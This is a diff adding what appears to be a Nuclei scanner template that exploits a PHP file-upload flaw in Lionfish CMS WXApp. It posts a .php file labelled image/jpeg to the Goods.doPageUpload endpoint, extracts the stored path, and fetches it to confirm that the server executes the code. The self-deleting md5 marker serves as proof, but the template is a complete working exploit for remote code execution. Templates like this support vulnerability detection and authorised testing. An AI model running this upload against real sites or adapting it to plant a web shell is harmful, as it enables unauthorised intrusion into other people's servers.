@@ -1,0 +1,58 @@
+id: lionfish-cms-wxapp-php-upload
+
+info:
+  name: Lionfish CMS WXApp PHP File Upload
+  author: sharecast
+  severity: critical
+  description: |
+    This template exploits a vulnerability in Lionfish CMS WXApp where a PHP file can be uploaded and executed.
+  reference:
+    - https://www.cnblogs.com/KHZ521/p/14782653.html
+
+variables:
+  r1: "{{rand_int(40000, 44800)}}"
+  rboundary: "{{rand_text_alpha(8)}}"
+  randname: "{{rand_text_alpha(6)}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/wxapp.php?controller=Goods.doPageUpload"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}"
+    body: |
+      ------WebKitFormBoundary{{rboundary}}\r\n
+      Content-Disposition: form-data; name="upfile"; filename="{{randname}}.php"\r\n
+      Content-Type: image/jpeg\r\n\r\n
+      <?php echo md5({{r1}});unlink(__FILE__);?>\r\n
+      ------WebKitFormBoundary{{rboundary}}--\r\n
+    matchers:
+      - type: word
+        part: body
+        words:
+          - ".php"
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: uploaded_path
+        regex:
+          - '"image_o":"https?:\\/\\/.*?\\/(?P<path>.*?)"'
+        group: 1
+        internal: true
+
+  - id: verify-file
+    method: GET
+    path:
+      - "{{BaseURL}}/{{uploaded_path}}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{md5(r1)}}"
+      - type: status
+        status:
+          - 200
